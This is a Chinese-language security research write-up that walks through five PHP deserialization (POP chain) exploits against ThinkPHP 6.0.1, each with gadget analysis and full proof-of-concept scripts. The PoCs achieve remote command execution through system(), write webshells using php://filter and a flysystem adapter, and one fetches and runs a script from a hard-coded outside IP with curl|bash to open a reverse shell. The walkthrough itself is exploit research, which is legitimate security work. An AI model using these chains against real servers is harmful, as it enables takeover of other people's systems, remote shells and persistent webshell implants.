# 环境搭建

复现环境:thinkphp6.0.1

php:7.3.4

thinkphp6只能通过composer安装还不能安装旧版本可以到这里去下载

https://www.jsdaima.com/blog/205.html

```
php think run
```

在app/controller/Index.php下添加控制器

```
<?php
namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        if(isset($_POST['data'])){
            unserialize(base64_decode($_POST['data']));
        }else{
            highlight_file(__FILE__);
        }
    }
}
```

# 第一条链子

## 漏洞分析

在 ThinkPHP5.x 的POP链中，入口都是 think\process\pipes\Windows 类，通过该类触发任意类的 `__toString` 方法。但是 ThinkPHP6.x 的代码移除了 think\process\pipes\Windows 类，而POP链 `__toString` 之后的 Gadget 仍然存在，所以我们得继续寻找可以触发 `__toString` 方法的点

寻找destruct方法,定位到了

```
vendor\topthink\think-orm\src\Model.php
```

![image-20211102223304306](images/1.png)

发现`$this->lazySave`参数可控,这样就可以去调用save函数

跟进save()

```
public function save(array $data = [], string $sequence = null): bool
{
    // 数据对象赋值
    $this->setAttrs($data);

    if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
        return false;
    }

    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);

    if (false === $result) {
        return false;
    }

    // 写入回调
    $this->trigger('AfterWrite');

    // 重新记录原始数据
    $this->origin   = $this->data;
    $this->set      = [];
    $this->lazySave = false;

    return true;
}
```

发现这句语句

```
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

不过要执行到这句语句需要满足一个if判断条件,否则会直接返回false

```
if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
        return false;
    }
```

跟进isEmpty()

![image-20211102223903554](images/2.png)

`$this->data`只要不为空即可,然后`$this->trigger('BeforeWrite')`的值需要为true

跟进trigger()

![image-20211102224046519](images/3.png)

直接让`$this->withEvent`的值为false进入if返回true即可

这样就执行到了三目运算符语句

```
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

分别跟进`updateData`和`insertData`去寻找可利用的地方

跟进updateData

```
protected function updateData(): bool
{
    // 事件回调
    if (false === $this->trigger('BeforeUpdate')) {
        return false;
    }

    $this->checkData();

    // 获取有更新的数据
    $data = $this->getChangedData();

    if (empty($data)) {
        // 关联更新
        if (!empty($this->relationWrite)) {
            $this->autoRelationUpdate();
        }

        return true;
    }

    if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
        // 自动写入更新时间
        $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
        $this->data[$this->updateTime] = $data[$this->updateTime];
    }

    // 检查允许字段
    $allowFields = $this->checkAllowFields();

    foreach ($this->relationWrite as $name => $val) {
        if (!is_array($val)) {
            continue;
        }

        foreach ($val as $key) {
            if (isset($data[$key])) {
                unset($data[$key]);
            }
        }
    }

    // 模型更新
    $db = $this->db();
    $db->startTrans();

    try {
        $this->key = null;
        $where     = $this->getWhere();

        $result = $db->where($where)
            ->strict(false)
            ->cache(true)
            ->setOption('key', $this->key)
            ->field($allowFields)
            ->update($data);

        $this->checkResult($result);

        // 关联更新
        if (!empty($this->relationWrite)) {
            $this->autoRelationUpdate();
        }

        $db->commit();

        // 更新回调
        $this->trigger('AfterUpdate');

        return true;
    } catch (\Exception $e) {
        $db->rollback();
        throw $e;
    }
}
```

根据poc指向下一个利用点是`checkAllowFields`

但是要进入并调用该函数，需要先通过前面两处的if语句

![image-20211103153119041](images/4.png)

第一个if我们开始已经让`$this->trigger()`的返回值为true了,不用进入这个if

第二个if要判断$data是否为空,这就要跟进getChangeData去看看了

跟进`getChangeData`

![image-20211103153348757](images/5.png)

值需要让`$this->force`为true就可以直接返回可控的`$data`,然后不为空就可以不用进入第二个if

跟进一下`checkAllowFields`

```
protected function checkAllowFields(): array
{
    // 检测字段
    if (empty($this->field)) {
        if (!empty($this->schema)) {
            $this->field = array_keys(array_merge($this->schema, $this->jsonType));
        } else {
            $query = $this->db();
            $table = $this->table ? $this->table . $this->suffix : $query->getTable();

            $this->field = $query->getConnection()->getTableFields($table);
        }

        return $this->field;
    }

    $field = $this->field;

    if ($this->autoWriteTimestamp) {
        array_push($field, $this->createTime, $this->updateTime);
    }

    if (!empty($this->disuse)) {
        // 废弃字段
        $field = array_diff($field, $this->disuse);
    }

    return $field;
}
```

当`$this->field`为空并且`$this->schema`为空的时候可以调用db函数

![image-20211102231702049](images/6.png)

跟进db

![image-20211102231912787](images/7.png)

这里有拼接字符串操作,`$this->name`和`$this->suffix`只要为对应的类名就可以去调用`__toString`了

调用链如下

```
__destruct()——>save()——>updateData()——>checkAllowFields()——>db()——>$this->table . $this->suffix（字符串拼接）——>toString()
```

`__toString`的话就可以直接用tp5的后半段链子,只是有一点点不同而已

不过这里还有一个问题,Model是一个抽象类,不能实例化

![image-20211102233206101](images/8.png)

我们需要去找他的一个子类Pivot (src/model/Pivot.php)进行实例化

![image-20211102233317660](images/9.png)

问题解决了就来跟进`__toString`方法了

定位到

```
vendor\topthink\think-orm\src\model\concern\Conversion.php
```

![image-20211102233529828](images/10.png)

跟进toJson

![image-20211102233553255](images/11.png)

跟进toArray()

![image-20211102234337941](images/12.png)

对 `$data `进行遍历，其中 `$key` 为 `$data` 的键。默认情况下，会进入第二个 `elseif` 语句，从而将 `$key` 作为参数调用 `getAttr()` 方法。

跟进getAttr()

![image-20211102234756760](images/13.png)

先回调用getData,跟进一下

![image-20211102235212176](images/14.png)

跟进getRealFieldName

![image-20211102235238628](images/15.png)

直接返回一个值,这里的`$this->strict`可控,只要为true就返回`$name`的值,而`$name`是刚才传进来的`$key`

所以这里就相当于返回`$name`

回到getData函数

![image-20211102235621210](images/16.png)

这里就相当于直接返回了应该`$this->data[$key]`

回到getAttr函数,下一步会调用getValue

![image-20211102235710087](images/17.png)

跟进getValue

![image-20211102235740024](images/18.png)

看到这里是一个可用rce的点

```
$value   = $closure($value, $this->data);
```

先判断是否存在`$this->withAttr[$fieldName]`这里的`$this->withAttr[$fieldName]`并不是数组所以会进入else语句

执行到

```
$closure = $this->withAttr[$fieldName];
$value   = $closure($value, $this->data);
```

`$this->withAttr[$fieldName]`和`$this->data`是可控的,而`$this->data`即是他的键值

那只要让`$closure='system'`然后`$value`为要执行的命令即可

`$value`的值是在getData里面可以控制的

都能控制,那这样就可以去rce了

## 漏洞复现

poc如下

```
<?php

namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave = false;
    private $exists = true;
    private $data = [];
    protected $withEvent = true;
    function __construct($obj)
    {
        $this->lazySave = true;
        $this->exists = true;
        $this->withEvent = false;
        $this->data = ['key' => 'calc'];
        $this->table = $obj;
        $this->strict = true;
        $this->visible = ["key" => 1];
    }
}

namespace think\model\concern;

trait Attribute
{
    private $withAttr = ["key" => "system"];
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
    function __construct($obj)
    {
        parent::__construct($obj);
    }
}

$obj1 = new Pivot(null);
echo base64_encode(serialize(new Pivot($obj1)));
```

这里的poc中并没有看到Conversion这个类,是因为在Model类中的引用已经有Conversion这个类了,当我们实例化他的子类的时候,可以去调用了他引用里面的`__toString`方法

![image-20211103160731808](images/19.png)

Attribute和Conversion这两个类与Model类是通的,所以属性可以全部在Model里面定义

自己写了个exp

```
<?php

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
    }
    $obj1 = new Pivot('');
    echo base64_encode(serialize(new Pivot($obj1)));
}

namespace think {

    use think\model\concern\Attribute;

    abstract class Model
    {
        private $lazySave;
        private $exists;
        private $data = [];
        private $withAttr = [];
        public function __construct($obj)
        {
            $this->lazySave = true;
            $this->withEvent = false;
            $this->exists = true;
            $this->table = $obj;
            $this->data = ['key' => 'whoami'];
            $this->visible = ["key" => 1];
            $this->withAttr = ['key' => 'system'];
        }
    }
}

namespace think\model\concern {
    trait Attribute
    {
    }
}
```

# 第二条链子

## 漏洞分析

寻找其他的入口点

```
vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
```

![image-20211104212941071](images/20.png)

跟进save,这是一个抽象类,所以我们应该到其子类去寻找可用的save方法

![image-20211104213208393](images/21.png)

```
src/think/filesystem/CacheStore.php
```

![image-20211104213306230](images/22.png)

其实我看了看另外几个save方法,就这个最简单了

`$this->store`可控,可以去调用任意类的set方法,没有则调用`__call`

这里先出发去找可用的set方法

定位到`src/think/cache/driver/File.php`

```
public function set($name, $value, $expire = null): bool
{
    $this->writeTimes++;

    if (is_null($expire)) {
        $expire = $this->options['expire'];
    }

    $expire   = $this->getExpireTime($expire);
    $filename = $this->getCacheKey($name);

    $dir = dirname($filename);

    if (!is_dir($dir)) {
        try {
            mkdir($dir, 0755, true);
        } catch (\Exception $e) {
            // 创建失败
        }
    }

    $data = $this->serialize($value);

    if ($this->options['data_compress'] && function_exists('gzcompress')) {
        //数据压缩
        $data = gzcompress($data, 3);
    }

    $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
    $result = file_put_contents($filename, $data);

    if ($result) {
        clearstatcache();
        return true;
    }

    return false;
}
```

跟进getExpireTime

![image-20211104214142935](images/23.png)

发现没什么可用的

跟进getCacheKey

![image-20211104214216656](images/24.png)

这里其实就是为了查看进入该方法是否出现错误或者直接`return`了

所以这里`$this->options['hash_type']`不能为空

返回了一个字符拼接的值,`$this->options['path']`可控,又可以去调用上一条链子的__toString

## 漏洞复现

poc

```
<?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache
    {
        protected $autosave;
        public function __construct()
        {
            $this->autosave = false;
        }
    }
}

namespace think\filesystem {

    use League\Flysystem\Cached\Storage\AbstractCache;
    use think\cache\driver\File;

    class CacheStore extends AbstractCache
    {
        protected $store;
        protected $expire;
        protected $key;
        public function __construct()
        {
            $this->store = new File();
            $this->expire = 1;
            $this->key = '1';
        }
    }
    echo base64_encode(serialize(new CacheStore()));
}

namespace think\cache {

    use think\model\Pivot;

    abstract class Driver
    {
        protected $options = [
            'expire' => 0,
            'cache_subdir' => true,
            'prefix' => '',
            'path' => '',
            'hash_type' => 'md5',
            'data_compress' => false,
            'tag_prefix' => 'tag:',
            'serialize' => ['system'],
        ];
        public function __construct()
        {
            $this->options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => new Pivot(),
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
        }
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File extends Driver
    {
    }
}

namespace think {

    use think\model\concern\Attribute;

    abstract class Model
    {
        private $data = [];
        private $withAttr = [];
        public function __construct()
        {
            $this->data = ['key' => 'whoami'];
            $this->visible = ["key" => 1];
            $this->withAttr = ['key' => 'system'];
        }
    }
}

namespace think\model\concern {
    trait Attribute
    {
    }
}

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
    }
}
```

![image-20211104232549090](images/25.png)

# 第三条链子

## 漏洞分析

回到上一条链子的set方法

![image-20211104233025402](images/26.png)

当我们退出getCacheKey后往下面走会进入一个serialize方法

跟进serialize

![image-20211104233116709](images/27.png)

这里的`$this->options['serialize']`可控,绕过`$data`的值可控的话就可以去RCE

回到前面可控$data怎么来的

![image-20211104233326102](images/28.png)

serialize方法的参数值是set方法的`$value`

继续回溯到set方法前面的save方法看看`$value`是如何来的

![image-20211104233438810](images/29.png)

是`$content`的值,跟进`getForStorage()`

![image-20211104233516032](images/30.png)

返回一个json格式的数据

所以这里$data是一个被处理后的json数据,不过system函数能够处理json数据

![image-20211105101952127](images/31.png)

不过这里只有linux系统适用,因为反引号在window不起作用

## 漏洞复现

poc

```
<?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache
    {
        protected $autosave = false;
        protected $complete = "`curl xxx.xxx.xxx.xxx|bash`";
    }
}

namespace think\filesystem {

    use League\Flysystem\Cached\Storage\AbstractCache;

    class CacheStore extends AbstractCache
    {
        protected $key = "1";
        protected $store;

        public function __construct($store = "")
        {
            $this->store = $store;
        }
    }
}

namespace think\cache {
    abstract class Driver
    {
        protected $options = [
            'expire' => 0,
            'cache_subdir' => true,
            'prefix' => '',
            'path' => '',
            'hash_type' => 'md5',
            'data_compress' => false,
            'tag_prefix' => 'tag:',
            'serialize' => ['system'],
        ];
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File extends Driver
    {
    }
}

namespace {
    $file = new think\cache\driver\File();
    $cache = new think\filesystem\CacheStore($file);
    echo base64_encode(serialize($cache));
}

```

这里执行命令虽然不知道为什么没有回显，但是可以curl去反弹shell

bash并没有反弹成功

![image-20211105103146411](images/32.png)

成功反弹shell

```
<?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache
    {
        protected $autosave = false;
        protected $complete = "`curl 47.93.248.221|bash`";
    }
}

namespace think\filesystem {

    use League\Flysystem\Cached\Storage\AbstractCache;
    use think\cache\driver\File;

    class CacheStore extends AbstractCache
    {
        protected $store;
        protected $key = "1";
        public function __construct()
        {
            $this->store = new File();
        }
    }
    echo base64_encode(serialize(new CacheStore()));
}

namespace think\cache {
    abstract class Driver
    {
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File extends Driver
    {
        protected $options = [
            'expire'        => 0,
            'cache_subdir'  => true,
            'prefix'        => '',
            'path'          => '',
            'hash_type'     => 'md5',
            'data_compress' => false,
            'tag_prefix'    => 'tag:',
            'serialize'     => ['system'],
        ];
    }
}
```



# 第四条链子

## 漏洞分析

继续回到set方法往下走

![image-20211105104428430](images/33.png)

发现一个file_put_contents函数

`$filename`是`getCacheKey()`的返回值

跟进`getCacheKey()`

![image-20211105104654944](images/34.png)

`$this->options['path']`和`$name`都是可控的,那文件名就可控了

然后就直接让`$this->options['hash_type']`为md5,`$this->options['path']`为filter过滤器,`$name=1`

文件名就是1的md5编码了

两个if可以控制参数不进入即可

文件名可控了,再回过头来看`$data`的值

![image-20211105104903514](images/35.png)

serialize方法返回了第一个$data的值,跟进serialize方法

![image-20211105105007852](images/36.png)

第三条链子已经提到了这么去控制这个返回值了,所以这里返回值也是可控的

不过`$serialize`的值需要是一个函数,并且不影响$data的值,这里可以用trim函数

可以看看效果

```
<?php
$a = json_encode([[], 'dasdasdsa']);
echo $a;
echo trim($a);
```

![image-20211105113702258](images/37.png)

而json_decode反而会让这里抛出异常

回到set继续往下看

![image-20211105105343879](images/38.png)

这里还有一个字符串拼接,前面标签内的东西可以直接用php://filter过滤器去除了所以写入的内容就是前面serialize方法返回的值

然后就是写入shell了

其实这里字符拼接,$data可控也是可以去调用toString的

## 漏洞复现

poc

```
<?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache
    {
        protected $autosave = false;
        protected $complete = "aaaPD9waHAgcGhwaW5mbygpOz8+";
    }
}

namespace think\filesystem {

    use League\Flysystem\Cached\Storage\AbstractCache;
    use think\cache\driver\File;

    class CacheStore extends AbstractCache
    {
        protected $store;
        protected $key = "1";
        public function __construct()
        {
            $this->store = new File();
        }
    }
    echo base64_encode(serialize(new CacheStore()));
}

namespace think\cache {
    abstract class Driver
    {
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File extends Driver
    {
        protected $options = [
            'expire'        => 1,
            'cache_subdir'  => false,
            'prefix'        => false,
            'path'          => 'php://filter/write=convert.base64-decode/resource=',
            'hash_type'     => 'md5',
            'data_compress' => false,
            'tag_prefix'    => 'tag:',
            'serialize'     => ['trim']
        ];
    }
}

```

![image-20211105164827142](images/39.png)

写入了文件,在public目录下

![image-20211105164928147](images/40.png)

# 第五条链子

## 漏洞分析

入口点还是

```
vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
```

![image-20211105195616372](images/41.png)

之前提到过,这是一个抽象类,他有几个子类对这个save方法进行了重写

之前我们找的是这下面的save方法

![image-20211105195704482](images/42.png)

再看看其他的save方法,定位到`src/Storage/Adapter.php`

![image-20211105195744232](images/43.png)

`$this->file`是可控的,$contents是getForStorage方法的返回值

跟进看看

![image-20211105200315495](images/44.png)

和之前的有点类似,返回一个json格式的数组

这里可以去想办法去找到可用的call方法 ,或者可用的has方法

还有一种,就是找到一个类同时存在has方法和可用的update方法和write方法

定位到`src/Adapter/Local.php`

同时存在以上三个方法

![image-20211105200117166](images/45.png)

![image-20211105200131102](images/46.png)

![image-20211105200141047](images/47.png)

看has方法

```
public function has($path)
{
    $location = $this->applyPathPrefix($path);

    return file_exists($location);
}
```

判断文件是否存在

跟进`applyPathPrefix`

![image-20211105200526362](images/48.png)

![image-20211105200818128](images/49.png)

跟进getPathPrefix

![image-20211105200544003](images/50.png)

直接返回一个可控值`$this->pathPrefix`

如果`$this->pathPrefix`为空,`applyPathPrefix`的返回值就是`$path`

`$path`是之前可控的`$this->file`

这里只有构建一个不存在的文件名即可进入save方法的if

跟进write

![image-20211105200131102](images/46.png)

有一个`file_put_contents`

`$location`的值和刚才一样已经分析过了

然后进入if判断，`$content`的值也是可控的,这里就可以用来写文件

占尽天时地利人和,下一步就是写马了

## 漏洞复现

```
<?php

namespace League\Flysystem\Cached\Storage;

abstract class AbstractCache
{
    protected $autosave = false;
    protected $cache = ['<?php phpinfo();?>'];
}


namespace League\Flysystem\Cached\Storage;

class Adapter extends AbstractCache
{
    protected $adapter;
    protected $file;

    public function __construct($obj)
    {
        $this->adapter = $obj;
        $this->file = 'DawnT0wn.php';
    }
}


namespace League\Flysystem\Adapter;

abstract class AbstractAdapter
{
}


namespace League\Flysystem\Adapter;

use League\Flysystem\Cached\Storage\Adapter;
use League\Flysystem\Config;

class Local extends AbstractAdapter
{

    public function has($path)
    {
    }

    public function write($path, $contents, Config $config)
    {
    }
}

$a = new Local();
$b = new Adapter($a);
echo base64_encode(serialize($b));

```

成功写入

![image-20211105201657028](images/52.png)

不过这里不能控制complete的值去写入,里面应该是会检验php标签



其实这里后半部分的gadget还在,只要找到可控的字符拼接这种类型的都可以去调用到后面的toString,在复现过程中,看到了几个地方都可以去调用toString的,不过只写了第二条链子

参考链接

https://whoamianony.top/2020/12/31/

https://xz.aliyun.com/t/10396#toc-3
